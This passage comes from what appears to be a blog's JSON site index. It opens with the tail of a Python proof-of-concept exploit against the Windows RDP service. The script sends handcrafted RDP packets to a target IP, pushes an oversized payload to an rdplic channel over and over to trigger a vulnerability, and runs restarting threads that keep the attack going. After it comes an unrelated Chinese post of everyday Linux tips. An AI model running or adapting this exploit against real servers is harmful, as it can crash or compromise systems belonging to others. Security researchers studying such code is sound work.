00\\x00\\x00\\x00\\x00\\xc4\\xff\\xff\\xff\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x64\\x00\\x00\\x00&quot; tls.sendall(p)def send_channel_packets(tls): p1 = b&quot;\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x04\\x01\\x00\\x01\\x00&quot; tls.sendall(p1) p2 = b&quot;\\x03\\x00\\x00\\x08\\x02\\xf0\\x80\\x28&quot; tls.sendall(p2) tls.recv(1024) p4 = b&quot;\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xeb&quot; tls.sendall(p4) tls.recv(1024) p5 = b&quot;\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xec&quot; tls.sendall(p5) tls.recv(1024) p6 = b&quot;\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xed&quot; tls.sendall(p6) tls.recv(1024) p7 = b&quot;\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xee&quot; tls.sendall(p7) tls.recv(1024) p8 = b&quot;\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38\\x00\\x07\\x03\\xef&quot; tls.sendall(p8) tls.recv(1024)def send_confirm_active(tls, shareid): p = &quot;\\x03\\x00\\x02\\x63\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x82\\x54\\x54\\x02\\x13\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\xea\\x03\\x06\\x00\\x3e\\x02\\x4d\\x53\\x54\\x53\\x43\\x00\\x17\\x00\\x00\\x00\\x01\\x00\\x18\\x00\\x01\\x00\\x03\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x1d\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x1c\\x00\\x20\\x00\\x01\\x00\\x01\\x00\\x01\\x00\\x80\\x07\\x38\\x04\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x1a\\x01\\x00\\x00\\x00\\x03\\x00\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x14\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\xaa\\x00\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x01\\x01\\x01\\x00\\x01\\x00\\x00\\x00\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x00\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\xa1\\x06\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x84\\x03\\x00\\x00\\x00\\x00\\x00\\xe4\\x04\\x00\\x00\\x13\\x00\\x28\\x00\\x03\\x00\\x00\\x03\\x78\\x00\\x00\\x00\\x78\\x00\\x00\\x00\\xfc\\x09\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0a\\x00\\x08\\x00\\x06\\x00\\x00\\x00\\x07\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x02\\x00\\x08\\x00\\x0a\\x00\\x01\\x00\\x14\\x00\\x15\\x00\\x09\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x0d\\x00\\x58\\x00\\x91\\x00\\x20\\x00\\x09\\x04\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x0e\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x10\\x00\\x34\\x00\\xfe\\x00\\x04\\x00\\xfe\\x00\\x04\\x00\\xfe\\x00\\x08\\x00\\xfe\\x00\\x08\\x00\\xfe\\x00\\x10\\x00\\xfe\\x00\\x20\\x00\\xfe\\x00\\x40\\x00\\xfe\\x00\\x80\\x00\\xfe\\x00\\x00\\x01\\x40\\x00\\x00\\x08\\x00\\x01\\x00\\x01\\x03\\x00\\x00\\x00\\x0f\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x11\\x00\\x0c\\x00\\x01\\x00\\x00\\x00\\x00\\x28\\x64\\x00\\x14\\x00\\x0c\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x15\\x00\\x0c\\x00\\x02\\x00\\x00\\x00\\x00\\x0a\\x00\\x01\\x1a\\x00\\x08\\x00\\xaf\\x94\\x00\\x00\\x1c\\x00\\x0c\\x00\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1b\\x00\\x06\\x00\\x01\\x00\\x1e\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x18\\x00\\x0b\\x00\\x02\\x00\\x00\\x00\\x03\\x0c\\x00\\x1d\\x00\\x5f\\x00\\x02\\xb9\\x1b\\x8d\\xca\\x0f\\x00\\x4f\\x15\\x58\\x9f\\xae\\x2d\\x1a\\x87\\xe2\\xd6\\x01\\x03\\x00\\x01\\x01\\x03\\xd4\\xcc\\x44\\x27\\x8a\\x9d\\x74\\x4e\\x80\\x3c\\x0e\\xcb\\xee\\xa1\\x9c\\x54\\x05\\x31\\x00\\x31\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x25\\x00\\x00\\x00\\xc0\\xcb\\x08\\x00\\x00\\x00\\x01\\x00\\xc1\\xcb\\x1d\\x00\\x00\\x00\\x01\\xc0\\xcf\\x02\\x00\\x08\\x00\\x00\\x01\\x40\\x00\\x02\\x01\\x01\\x01\\x00\\x01\\x40\\x00\\x02\\x01\\x01\\x04&quot; ba = bytearray() ba.extend(map(ord, p)) tls.sendall(bytes(ba))def send_establish_session(tls): p = b&quot;\\x03\\x00\\x00\\x24\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x16\\x16\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x08\\x00\\x1f\\x00\\x00\\x00\\x01\\x00\\xea\\x03&quot; tls.sendall(p) p = b&quot;\\x03\\x00\\x00\\x28\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x1a\\x1a\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x0c\\x00\\x14\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; tls.sendall(p) p = b&quot;\\x03\\x00\\x00\\x28\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x1a\\x1a\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x0c\\x00\\x14\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; tls.sendall(p) p = b&quot;\\x03\\x00\\x05\\x81\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x85\\x72\\x72\\x05\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x00\\x00\\x2b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa9\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\xa3\\xce\\x20\\x35\\xdb\\x94\\xa5\\xe6\\x0d\\xa3\\x8c\\xfb\\x64\\xb7\\x63\\xca\\xe7\\x9a\\x84\\xc1\\x0d\\x67\\xb7\\x91\\x76\\x71\\x21\\xf9\\x67\\x96\\xc0\\xa2\\x77\\x5a\\xd8\\xb2\\x74\\x4f\\x30\\x35\\x2b\\xe7\\xb0\\xd2\\xfd\\x81\\x90\\x1a\\x8f\\xd5\\x5e\\xee\\x5a\\x6d\\xcb\\xea\\x2f\\xa5\\x2b\\x06\\xe9\\x0b\\x0b\\xa6\\xad\\x01\\x2f\\x7a\\x0b\\x7c\\xff\\x89\\xd3\\xa3\\xe1\\xf8\\x00\\x96\\xa6\\x8d\\x9a\\x42\\xfc\\xab\\x14\\x05\\x8f\\x16\\xde\\xc8\\x05\\xba\\xa0\\xa8\\xed\\x30\\xd8\\x67\\x82\\xd7\\x9f\\x84\\xc3\\x38\\x27\\xda\\x61\\xe3\\xa8\\xc3\\x65\\xe6\\xec\\x0c\\xf6\\x36\\x24\\xb2\\x0b\\xa6\\x17\\x1f\\x46\\x30\\x16\\xc7\\x73\\x60\\x14\\xb5\\xf1\\x3a\\x3c\\x95\\x7d\\x7d\\x2f\\x74\\x7e\\x56\\xff\\x9c\\xe0\\x01\\x32\\x9d\\xf2\\xd9\\x35\\x5e\\x95\\x78\\x2f\\xd5\\x15\\x6c\\x18\\x34\\x0f\\x43\\xd7\\x2b\\x97\\xa9\\xb4\\x28\\xf4\\x73\\x6c\\x16\\xdb\\x43\\xd7\\xe5\\x58\\x0c\\x5a\\x03\\xe3\\x73\\x58\\xd7\\xd9\\x76\\xc2\\xfe\\x0b\\xd7\\xf4\\x12\\x43\\x1b\\x70\\x6d\\x74\\xc2\\x3d\\xf1\\x26\\x60\\x58\\x80\\x31\\x07\\x0e\\x85\\xa3\\x95\\xf8\\x93\\x76\\x99\\x9f\\xec\\xa0\\xd4\\x95\\x5b\\x05\\xfa\\x4f\\xdf\\x77\\x8a\\x7c\\x29\\x9f\\x0b\\x4f\\xa1\\xcb\\xfa\\x95\\x66\\xba\\x47\\xe3\\xb0\\x44\\xdf\\x83\\x03\\x44\\x24\\xf4\\x1e\\xf2\\xe5\\xcb\\xa9\\x53\\x04\\xc2\\x76\\xcb\\x4d\\xc6\\xc2\\xd4\\x3f\\xd3\\x8c\\xb3\\x7c\\xf3\\xaa\\xf3\\x93\\xfe\\x25\\xbd\\x32\\x7d\\x48\\x6e\\x93\\x96\\x68\\xe5\\x18\\x2b\\xea\\x84\\x25\\x69\\x02\\xa5\\x38\\x65\\x6f\\x0f\\x9f\\xf6\\xa1\\x3a\\x1d\\x22\\x9d\\x3f\\x6d\\xe0\\x4c\\xee\\x8b\\x24\\xf0\\xdc\\xff\\x70\\x52\\xa7\\x0d\\xf9\\x52\\x8a\\x1e\\x33\\x1a\\x30\\x11\\x15\\xd7\\xf8\\x95\\xa9\\xbb\\x74\\x25\\x8c\\xe3\\xe9\\x93\\x07\\x43\\xf5\\x50\\x60\\xf7\\x96\\x2e\\xd3\\xff\\x63\\xe0\\xe3\\x24\\xf1\\x10\\x3d\\x8e\\x0f\\x56\\xbc\\x2e\\xb8\\x90\\x0c\\xfa\\x4b\\x96\\x68\\xfe\\x59\\x68\\x21\\xd0\\xff\\x52\\xfe\\x5c\\x7d\\x90\\xd4\\x39\\xbe\\x47\\x9d\\x8e\\x7a\\xaf\\x95\\x4f\\x10\\xea\\x7b\\x7a\\xd3\\xca\\x07\\x28\\x3e\\x4e\\x4b\\x81\\x0e\\xf1\\x5f\\x1f\\x8d\\xbe\\x06\\x40\\x27\\x2f\\x4a\\x03\\x80\\x32\\x67\\x54\\x2f\\x93\\xfd\\x25\\x5d\\x6d\\xa0\\xad\\x23\\x45\\x72\\xff\\xd1\\xeb\\x5b\\x51\\x75\\xa7\\x61\\xe0\\x3f\\xe4\\xef\\xf4\\x96\\xcd\\xa5\\x13\\x8a\\xe6\\x52\\x74\\x70\\xbf\\xc1\\xf9\\xfb\\x68\\x9e\\xdd\\x72\\x8f\\xb4\\x44\\x5f\\x3a\\xcb\\x75\\x2a\\x20\\xa6\\x69\\xd2\\x76\\xf9\\x57\\x46\\x2b\\x5b\\xda\\xba\\x0f\\x9b\\xe0\\x60\\xe1\\x8b\\x90\\x33\\x41\\x0a\\x2d\\xc5\\x06\\xfe\\xd0\\xf0\\xfc\\xde\\x35\\xd4\\x1e\\xaa\\x76\\x0b\\xae\\xf4\\xd5\\xbd\\xfa\\xf3\\x55\\xf5\\xc1\\x67\\x65\\x75\\x1c\\x1d\\x5e\\xe8\\x3a\\xfe\\x54\\x50\\x23\\x04\\xae\\x2e\\x71\\xc2\\x76\\x97\\xe6\\x39\\xc6\\xb2\\x25\\x87\\x92\\x63\\x52\\x61\\xd1\\x6c\\x07\\xc1\\x1c\\x00\\x30\\x0d\\xa7\\x2f\\x55\\xa3\\x4f\\x23\\xb2\\x39\\xc7\\x04\\x6c\\x97\\x15\\x7a\\xd7\\x24\\x33\\x91\\x28\\x06\\xa6\\xe7\\xc3\\x79\\x5c\\xae\\x7f\\x50\\x54\\xc2\\x38\\x1e\\x90\\x23\\x1d\\xd0\\xff\\x5a\\x56\\xd6\\x12\\x91\\xd2\\x96\\xde\\xcc\\x62\\xc8\\xee\\x9a\\x44\\x07\\xc1\\xec\\xf7\\xb6\\xd9\\x9c\\xfe\\x30\\x1c\\xdd\\xb3\\x3b\\x93\\x65\\x3c\\xb4\\x80\\xfb\\xe3\\x87\\xf0\\xee\\x42\\xd8\\xcf\\x08\\x98\\x4d\\xe7\\x6b\\x99\\x0a\\x43\\xed\\x13\\x72\\x90\\xa9\\x67\\xfd\\x3c\\x63\\x36\\xec\\x55\\xfa\\xf6\\x1f\\x35\\xe7\\x28\\xf3\\x87\\xa6\\xce\\x2e\\x34\\xaa\\x0d\\xb2\\xfe\\x17\\x18\\xa2\\x0c\\x4e\\x5f\\xf0\\xd1\\x98\\x62\\x4a\\x2e\\x0e\\xb0\\x8d\\xb1\\x7f\\x32\\x52\\x8e\\x87\\xc9\\x68\\x7c\\x0c\\xef\\xee\\x88\\xae\\x74\\x2a\\x33\\xff\\x4b\\x4d\\xc5\\xe5\\x18\\x38\\x74\\xc7\\x28\\x83\\xf7\\x72\\x87\\xfc\\x79\\xfb\\x3e\\xce\\xd0\\x51\\x13\\x2d\\x7c\\xb4\\x58\\xa2\\xe6\\x28\\x67\\x4f\\xec\\xa6\\x81\\x6c\\xf7\\x9a\\x29\\xa6\\x3b\\xca\\xec\\xb8\\xa1\\x27\\x50\\xb7\\xef\\xfc\\x81\\xbf\\x5d\\x86\\x20\\x94\\xc0\\x1a\\x0c\\x41\\x50\\xa9\\x5e\\x10\\x4a\\x82\\xf1\\x74\\x1f\\x78\\x21\\xf5\\x70\\x61\\x24\\x00\\x3d\\x47\\x5f\\xf3\\x25\\x80\\x3c\\x4b\\xea\\xa3\\xf4\\x77\\xea\\xa1\\x42\\x1a\\x17\\x0f\\x6d\\xa8\\x35\\x9e\\x91\\x26\\x34\\x43\\x04\\xc6\\xc6\\x5b\\x21\\x7d\\x8c\\xc7\\x22\\x91\\x7b\\x2c\\x2d\\x2f\\xd6\\x7e\\xa5\\x52\\xa8\\x08\\x80\\xeb\\x60\\xd1\\x44\\x09\\x8e\\x3c\\xa1\\xaa\\x67\\x60\\x0a\\x26\\xc6\\xb5\\xc6\\x79\\xa6\\x4f\\x8b\\x8c\\x25\\x5c\\xf1\\x0b\\x23\\xf4\\xd8\\xa6\\x6d\\xf1\\x91\\x78\\xf9\\xe5\\x2a\\x50\\x2f\\x5a\\x44\\x22\\xd9\\x19\\x5c\\xaf\\xd6\\xac\\x97\\xa2\\xf8\\x0d\\x0c\\xe3\\xdd\\x88\\x48\\x98\\x28\\x0b\\x8b\\xbd\\x76\\xdc\\xde\\xca\\xe2\\xc2\\x4a\\x87\\x50\\xd4\\x8c\\x77\\x5a\\xd8\\xb2\\x74\\x4f\\x30\\x35\\xbf\\x28\\xae\\xd9\\xa2\\x98\\xa5\\xbc\\x60\\xca\\xb8\\x90\\x4d\\x20\\x46\\xd9\\x8a\\x1a\\x30\\x01\\x8b\\x38\\x63\\x1a\\x57\\x09\\x51\\x46\\x95\\x9b\\xd8\\x80\\x0c\\xb0\\x77\\x24\\xbf\\x2b\\xd3\\x57\\x22\\xd9\\x19\\x5c\\xaf\\xd6\\xac\\x97\\xa2\\xf8\\x0d\\x0c\\xe3\\xdd\\x88\\x48\\x98\\x28\\x0b\\x8b\\xbd\\x76\\xdc\\xde\\xca\\xe2\\xc2\\x4a\\x87\\x50\\xd4\\x8c\\x56\\x92\\x38\\xed\\x6b\\x9b\\x5b\\x1f\\xba\\x53\\xa1\\x0e\\xf7\\x75\\x10\\x53\\x22\\x4c\\x0a\\x75\\x88\\x54\\x69\\x3f\\x3b\\xf3\\x18\\x67\\x6b\\x0f\\x19\\xd1\\x00\\x25\\x86\\xcd\\xa8\\xd9\\xdd\\x1d\\x8d\\x26\\x87\\x54\\xd9\\x79\\xc0\\x74\\x65\\x90\\xd7\\x33\\x32\\xaf\\xba\\x9d\\x5a\\xd5\\x6c\\x7c\\xa1\\x47\\xe1\\x49\\x6e\\x1c\\xce\\x9f\\x62\\xaa\\x26\\x16\\x3f\\x3c\\xec\\x5b\\x49\\xe5\\xc0\\x60\\xd4\\xbe\\xa7\\x88\\xbc\\xa1\\x9f\\x29\\x71\\x8c\\xeb\\x69\\xf8\\x73\\xfb\\xaf\\x29\\xaa\\x40\\x1b\\xe5\\x92\\xd2\\x77\\xa7\\x2b\\xfb\\xb6\\x77\\xb7\\x31\\xfb\\xdc\\x1e\\x63\\x63\\x7d\\xf2\\xfe\\x3c\\x6a\\xba\\x0b\\x20\\xcb\\x9d\\x64\\xb8\\x31\\x14\\xe2\\x70\\x07\\x2c\\xdf\\x9c\\x6f\\xb5\\x3a\\xc4\\xd5\\xb5\\xc9\\x3e\\x9a\\xd7\\xd5\\x30\\xdc\\x0e\\x19\\x89\\xc6\\x08\\x88\\xe1\\xca\\x81\\xa6\\x28\\xdd\\x9c\\x74\\x05\\x11\\xe7\\xe1\\xcc\\xbc\\xc7\\x76\\xdd\\x55\\xe2\\xcc\\xc2\\xcb\\xd3\\xb6\\x48\\x01\\xdd\\xff\\xba\\xca\\x31\\xab\\x26\\x44\\x1c\\xdc\\x06\\x01\\xdf\\xf2\\x90\\x50\\xb8\\x6b\\x8f\\xe8\\x29\\xf0\\xba\\xec\\xfb\\x2d\\xfd\\x7a\\xfc\\x7f\\x57\\xbd\\xea\\x90\\xf7\\xcf\\x92\\x1e\\xc4\\x20\\xd0\\xb6\\x9f\\xd6\\xdc\\xa1\\x82\\xa9\\x6c\\x5e\\x3e\\x83\\x41\\x57\\x73\\xe9\\xe7\\x5a\\x3f\\xda\\x24\\x4f\\x73\\x5e\\xf4\\xe0\\x92\\x24\\xbd\\x0b\\xd0\\x3c\\x49\\x96\\xb5\\xb5\\x05\\x32\\xcb\\x58\\x1d\\x6f\\x97\\x51\\xee\\x0c\\xdc\\x0b\\x2a\\x60\\xef\\x97\\x3e\\x5a\\x30\\x81\\x15\\x91\\xcf\\x11\\x07\\x25\\x2c\\x41\\xdb\\x70\\x72\\xe1\\x75\\xf6\\xa5\\xff\\xe8\\x44\\xe7\\x03\\xe3\\x61\\xaa\\xdb\\xe0\\x07\\x3d\\x07\\x0b\\xe3\\x5c\\x09\\xa9\\x5e\\x10\\xfd\\xcf\\x74\\x9e\\x23\\xf1\\x30\\x86\\x16\\xef\\x25\\x4e\\xfe\\xa4\\x93\\xa5\\x80\\x0a\\x01\\x39\\xcc\\x11\\x7a\\x6e\\x94\\x22\\x5b\\xd8\\xc6\\xc9\\xa8\\xdf\\x13\\x96\\xb3\\x91\\x33\\x6e\\x87\\xbb\\x94\\x63\\x2d\\x88\\x64\\xa7\\x58\\x89\\xda\\xdc\\x7f\\x2a\\xe3\\xa1\\x66\\xe5\\xc8\\x7f\\xc2\\xdb\\xc7\\x7d\\x2f\\xa9\\x46\\x28\\x45\\x69\\xbc\\xac\\x9f\\x85\\x9e\\xb0\\x9f\\x9a\\x49\\xb4\\xb1\\xcb&quot; # SBC_HandlePersistentCacheList tls.sendall(p) p = b&quot;\\x03\\x00\\x00\\x28\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x1a\\x1a\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x00\\x00\\x27\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x32\\x00&quot; # USR_ProcessRemoteFonts tls.sendall(p)def send_data_to_rdplic(tls, arch): if arch == &quot;32&quot;: p = b&quot;\\x03\\x00\\x00\\x2e\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xef\\x70\\x14\\x0c\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; elif arch == &quot;64&quot;: p = b&quot;\\x03\\x00\\x00\\x2e\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xef\\x70\\x14&quot; p1 = b&quot;\\x03\\x00\\x00\\x2e\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xef\\x70\\x14\\x00&quot; p2 = &quot;\\x04\\x00\\x00\\x00\\x03\\x00\\x00\\x00&quot;+&quot;\\x50\\x00\\x03\\x00&quot; else: print(&quot;Make the second arguement &#x27;32&#x27; or &#x27;64&#x27; without quotes&quot;) sys.exit() ba = bytearray() ba.extend(map(ord, p+p2)) # # tpkt len ba[2] = struct.pack(&quot;&gt;h&quot;, len(p+p2))[0] ba[3] = struct.pack(&quot;&gt;h&quot;, len(p+p2))[1] # # # MCSi len ba[7+6] = len(p2) tls.sendall(bytes(ba)) # trigger p3 = &quot;\\x04\\x00\\x00\\x00\\x03\\x00\\x00\\x00&quot;+&quot;\\x30\\x16&quot;+&#x27;\\x00\\x00&#x27;+struct.pack(&#x27;&lt;I&#x27;, 0x500)+&#x27;a&#x27;*0x500 bb = bytearray() bb.extend(map(ord, p1+p3)) # # tpkt len bb[2] = struct.pack(&quot;&gt;h&quot;, len(p1+p3))[0] bb[3] = struct.pack(&quot;&gt;h&quot;, len(p1+p3))[1] # # # MCSi len bb[7+6] = (len(p3)&gt;&gt;8)|0x80 bb[7+7] = len(p3)&amp;0xff while 1: tls.sendall(bytes(bb))IP = &#x27;&#x27;def main(): global IP tls = send_init_packets(IP) send_client_data(tls) print(&quot;[+] ClientData Packet Sent&quot;) send_channel_packets(tls) print(&quot;[+] ChannelJoin/ErectDomain/AttachUser Sent&quot;) send_client_info(tls) print(&quot;[+] ClientInfo Packet Sent&quot;) # print &quot;try recv&quot; # tls.recv(8192) # print &quot;try recv&quot; # tls.recv(8192) import time time.sleep(5) # Magic action! I don&#x27;t know why server won&#x27;t response correctly, but this works. send_confirm_active(tls, None) print(&quot;[+] ConfirmActive Packet Sent&quot;) send_establish_session(tls) print(&quot;[+] Session Established&quot;) send_data_to_rdplic(tls, &#x27;64&#x27;) print(&quot;[+] Vuln Should Trigger&quot;)def checkThread(sleeptimes=2,initThreadsName=[]): for i in range(0,10080):#循环运行 nowThreadsName=[]#用来保存当前线程名称 now=threading.enumerate()#获取当前线程名 for i in now: nowThreadsName.append(i.getName())#保存当前线程名称 for ip in initThreadsName: if ip in nowThreadsName: pass #当前某线程名包含在初始化线程组中，可以认为线程仍在运行 else: print &#x27;===&#x27;+ip,&#x27;stopped，now restart&#x27; t=threading.Thread(target=main,args=())#重启线程 t.setName(ip)#重设name t.start() time.sleep(sleeptimes)#隔一段时间重新运行，检测有没有线程downif __name__ == &#x27;__main__&#x27;: if len(sys.argv) !=2: print &quot;python poc.py 192.168.170.1&quot; exit(0) else: IP = sys.argv[1] print &#x27;target ip:&#x27;+IP names = [1,2,3,4] threads=[] initThreadsName=[]#保存初始化线程组名字 for i in names: t=threading.Thread(target=main,args=()) t.setName(i) threads.append(t) for t in threads: t.start() init=threading.enumerate()#获取初始化的线程对象 for i in init: initThreadsName.append(i.getName())#保存初始化线程组名字 check=threading.Thread(target=checkThread,args=(2,initThreadsName))#用来检测是否有线程down并重启down线程 check.setName(&#x27;Thread:check&#x27;) check.start()","categories":[],"tags":[],"keywords":[]},{"title":"Linux 使用技巧","slug":"linux-skill","date":"2022-06-17T11:38:05.952Z","updated":"2022-05-07T02:19:42.872Z","comments":true,"path":"2022/06/17/linux-skill/","link":"","permalink":"http://474172261.github.io/2022/06/17/linux-skill/","excerpt":"","text":"不定期更新 两个linux文件互传1$ scp -r linux-2.6.26 root@(目标ip)IP:/usr/src/(假设放到/usr/src路径) 将一个本地程序做成一个本地服务程序1$ socat tcp-l:2333,reuseaddr,fork exec:./pwn1 服务端口在2333，使用nc 127.0.0.1 2333连接 获取ubuntu当前内核的源码进入lauchpad, 分清你的系统名称, 比如 20.04 叫 Focal Fossa, 系统当前版本: 12$ uname -r5.13.0-35-generic 那么我们在页面的以下部分会看到以下部分的内容 Active series and milestones 22.04 “Jammy” series - developmentMilestones: jammy-updates, ubuntu-22.04, ubuntu-22.04-beta, ubuntu-22.03, ubuntu-22.02, ubuntu-22.04-feature-freeze, ubuntu-22.01, ubuntu-21.12, and ubuntu-21.11 21.10 “Impish” series - currentMilestones: impish-updates 20.04 “Focal” series - supported &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;Milestones: focal-updates and ubuntu-20.04.4 18.04 “Bionic” series - supportedMilestones: bionic-updates 16.04 “Xenial” series - supportedMilestones: xenial-updates 14.04 “Trusty” series - supportedMilestones: ubuntu-14.04.6 All series All milestones 点击其中的focal series, 会出现搜索框, 我们就搜索linux-image-5.13.0-35-generic, 会得到如下几个结果: 123456789101112 linux-image-5.13.0-35-generic: &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;Signed kernel image generic linux-image-5.13.0-35-generic-dbgsym:Signed kernel image generic linux-image-5.13.0-35-generic-lpae:Linux kernel image for version 5.13.0 on ARM (hard float) SMP linux-image-5.13.0-35-generic-lpae-dbgsym:Linux kernel debug image for version 5.13.0 on ARM (hard float) SMP linux-image-5.13.0-35-generic-64k:Signed kernel image generic-64k linux-image-5.13.0-35-generic-64k-dbgsym:Signed kernel image generic-64k 选择第一个, 出现如下: 123456789101112131415161718Signed kernel image generic A kernel image for generic. This version of it is signed with Canonical&#x27;s UEFI/Opal signing key.Source packagelinux-signed-hwe-5.13 5.13.0-35.40~20.04.1 source package in Ubuntu &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;Published versionslinux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in amd64 (Updates)linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in amd64 (Security)linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in arm64 (Updates)linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in arm64 (Security)linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in armhf (Updates)linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in armhf (Security)linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in ppc64el (Updates)linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in ppc64el (Security)linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in s390x (Updates)linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in s390x (Security) 此处我选Source package下的链接. 之后选择downloads里的tar.xz文件即可. 这个版本的文件里包含的是一个下载脚本, 并没有包含完整的src文件. 所以还是需要想想其它办法直接获得文件最好. 快速转换图片格式，修改分辨率12$ convert -resize 100x100 src.jpg dst.jpg$ convert -resize 50%x50% src.jpg dst.jpg 修改文件的用户12345678查看归属：$ ls -l file赋给用户hv$ chown hv:hv file如果需要把某个文件夹下所有都付给某个用户$ chown hv:hv -R dir/* 使用audit记录创建的程序audit是记录linux审计信息的内核模块。他记录系统中的各种动作和事件，比如系统调用，文件修改，执行的程序，系统登入登出和记录所有系统中所有的事件。audit还可以将审计记录写入日志文件。 如果想记录新创建的process, 可以直接修改/etc/audit/audit.rules, 添加一行-a task,always, 之后通过cat /var/log/audit/audit.log|grep EXECVE 来筛选你想要的记录. 更多可以参考linux监控工具audit 修改terminal的显示路径1$ vim ~/.bashrc 找到 1234## If this is an xterm set the title to user@host:dircase “$TERM” inxterm|rxvt)PS1=”\\e]0;$debianchroot:+($debianchroot)\\u@\\h:\\w\\a$PS1” 将PS1那行修改为(其实就是把w换成W) 1PS1=”[\\u@\\h:\\W]\\\\$” 添加环境变量1export PATH=$PATH:/home/victorv 创建terminal的快捷键如果是在kali，terminal是没有快捷键的，到设置的keyboard里面，添加自定义快捷键，键值为 1gnome-terminal 或者安装nautilus-open-terminal gdb改变汇编代码显示方式1(gdb) set disas intel 设置反汇编代码使用的指令集，可选择 intel 指令集或 AT&amp;T指令集. usb驱动相关1234567891011121314查找usb驱动$ sudo lspci…02:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111/8168B PCI Express Gigabit Ethernet controller (rev 01)$ find /sys | grep drivers.*02:00获取usb设备信息lsusb -tcat /proc/bus/usb/deviceslshw卸载usb驱动tree /sys/bus/usb/driversecho -n “1-1:1.0” &gt; 